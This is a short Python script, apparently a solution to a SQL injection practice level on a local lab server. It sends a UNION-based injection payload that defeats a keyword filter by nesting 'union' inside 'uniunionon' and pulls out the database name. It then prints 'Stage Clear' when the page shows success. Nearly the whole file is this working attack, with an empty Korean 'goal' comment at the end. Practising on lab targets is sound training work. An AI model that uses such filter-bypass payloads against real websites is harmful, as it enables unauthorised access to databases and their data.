import requests

URL = "http://192.168.81.129/sqli/sqli5.php"
PAYLOAD = "?upw=%27%20uniunionon%20select%201,%20database(),%201,%201;--%20-"

resp = requests.get(URL + PAYLOAD)


if resp.text.find('Hello! sqli') > 0:
    print('Stage Clear')
else:
    print('Not yet')

'''
목표 : 
'''